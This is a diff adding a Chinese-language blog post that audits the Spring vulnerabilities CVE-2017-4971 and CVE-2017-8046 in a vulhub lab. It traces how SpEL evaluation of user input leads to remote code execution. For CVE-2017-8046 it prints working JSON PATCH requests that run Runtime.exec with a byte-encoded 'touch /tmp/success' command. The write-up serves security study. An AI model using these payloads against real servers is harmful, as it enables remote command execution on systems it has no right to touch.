@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CVE-2017-4971环境来源于vulhub，vulhub那个也是官方的example。 还是先理清路由的逻辑。仍然是DispatherServlet分发，来到FlowHandlerAdapter  往下几层会来到ViewState的处理。  在绑定数据的时候出现了问题。具体看addDefaultMappings和addEmptyValueMapping这两个函数。   这里检查参数要满足_开">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从spring历史漏洞学框架审计(2)">
+<meta property="og:url" content="http://example.com/2024/08/01/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CVE-2017-4971环境来源于vulhub，vulhub那个也是官方的example。 还是先理清路由的逻辑。仍然是DispatherServlet分发，来到FlowHandlerAdapter  往下几层会来到ViewState的处理。  在绑定数据的时候出现了问题。具体看addDefaultMappings和addEmptyValueMapping这两个函数。   这里检查参数要满足_开">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/spring001/image-20240801101504252.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801101542707.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801102141107.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801102151712.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801102236798.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801111631141.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801111708536.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801111801252.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801111927960.png">
+<meta property="og:image" content="http://example.com/spring001/image-20240801112105466.png">
+<meta property="article:published_time" content="2024-08-01T02:05:45.000Z">
+<meta property="article:modified_time" content="2024-08-01T03:26:45.500Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/spring001/image-20240801101504252.png">
+  
+  
+  
+  <title>从spring历史漏洞学框架审计(2) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从spring历史漏洞学框架审计(2)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-01 10:05" pubdate>
+          August 1, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          580 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          5 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从spring历史漏洞学框架审计(2)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CVE-2017-4971"><a href="#CVE-2017-4971" class="headerlink" title="CVE-2017-4971"></a>CVE-2017-4971</h1><p>环境来源于vulhub，vulhub那个也是官方的example。</p>
+<p>还是先理清路由的逻辑。仍然是DispatherServlet分发，来到FlowHandlerAdapter</p>
+<p><img src="/../spring001/image-20240801101504252.png" srcset="/img/loading.gif" lazyload alt="image-20240801101504252"></p>
+<p>往下几层会来到ViewState的处理。</p>
+<p><img src="/../spring001/image-20240801101542707.png" srcset="/img/loading.gif" lazyload alt="image-20240801101542707"></p>
+<p>在绑定数据的时候出现了问题。具体看addDefaultMappings和addEmptyValueMapping这两个函数。</p>
+<p><img src="/../spring001/image-20240801102141107.png" srcset="/img/loading.gif" lazyload alt="image-20240801102141107"></p>
+<p><img src="/../spring001/image-20240801102151712.png" srcset="/img/loading.gif" lazyload alt="image-20240801102151712"></p>
+<p>这里检查参数要满足_开头，正如官方文档说的那样。然后会调用addExmtyMapping</p>
+<p><img src="/../spring001/image-20240801102236798.png" srcset="/img/loading.gif" lazyload alt="image-20240801102236798"></p>
+<p>到这就可以了，用了Spel表达式对传入的field进行了getValue。导致了RCE。</p>
+<p>那么从漏洞发现者的角度来看，怎么寻找这样类型的漏洞？其实还是Spel表达式的使用，且有外部数据的输入。</p>
+<p>还有哪些场景可能会用到表达式？比如属性配置解析，复杂数据校验，动态的方法，流程啥的等等，未来可以关注一下。</p>
+<p>思路总结：</p>
+<p>参数绑定与表达式造成的漏洞</p>
+<p>路由处理</p>
+<h1 id="CVE-2017-8046"><a href="#CVE-2017-8046" class="headerlink" title="CVE-2017-8046"></a>CVE-2017-8046</h1><p>和上面一毛一样也是数据绑定出的问题。poc：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>200<br><br><span class="language-haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>vulhub<span class="hljs-string">&quot; &#125;]</span></span><br></code></pre></td></tr></table></figure>
+
+<p>发送patch方法的时候会出问题。</p>
+<p>关键在这：</p>
+<p><img src="/../spring001/image-20240801111631141.png" srcset="/img/loading.gif" lazyload alt="image-20240801111631141"></p>
+<p>来到convert</p>
+<p><img src="/../spring001/image-20240801111708536.png" srcset="/img/loading.gif" lazyload alt="image-20240801111708536"></p>
+<p>这里提取了path的值，然后new了一个ReplaceOperation。</p>
+<p>ReplaceOperation的父类是PatchOperation，点进去看下构造函数：</p>
+<p><img src="/../spring001/image-20240801111801252.png" srcset="/img/loading.gif" lazyload alt="image-20240801111801252"></p>
+<p>这里用了spel表达式，再往下看。</p>
+<p>回到刚刚的applyPatch，跟后面的apply方法</p>
+<p><img src="/../spring001/image-20240801111927960.png" srcset="/img/loading.gif" lazyload alt="image-20240801111927960"></p>
+<p>之前的ReplcaeOperation.perform的时候，进行了setValueOnTarget</p>
+<p><img src="/../spring001/image-20240801112105466.png" srcset="/img/loading.gif" lazyload alt="image-20240801112105466"></p>
+<p>封装了Spel表达式的setvalue。审计到这就可以结束了。</p>
+<p>很明显还有其他的payload。</p>
+<p>比如换成op换成add。</p>
+<p>或者</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>357<br><br><span class="language-dns">[&#123; &quot;op&quot;: &quot;copy&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;<span class="hljs-number">116,111,117,99</span>,<span class="hljs-number">104,32,47,116</span>,<span class="hljs-number">109,112,47,115</span>,<span class="hljs-number">117,99,99,101</span>,<span class="hljs-number">115,115</span>&#125;))/lastname&quot;,</span><br><span class="language-dns">&quot;from&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;<span class="hljs-number">116,111,117,99</span>,<span class="hljs-number">104,32,47,116</span>,<span class="hljs-number">109,112,47,115</span>,<span class="hljs-number">117,99,99,101</span>,<span class="hljs-number">115,115</span>&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></code></pre></td></tr></table></figure>
+
+<p>都可以。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java-security/" class="print-no-link">#java security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从spring历史漏洞学框架审计(2)</div>
+      <div>http://example.com/2024/08/01/从spring历史漏洞学框架审计-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 1, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/05/opentsdb%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-25826/" title="命令注入漏洞（CVE-2023-25826）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">命令注入漏洞（CVE-2023-25826）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/31/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-1/" title="从spring历史漏洞学框架审计(1)">
+                        <span class="hidden-mobile">从spring历史漏洞学框架审计(1)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
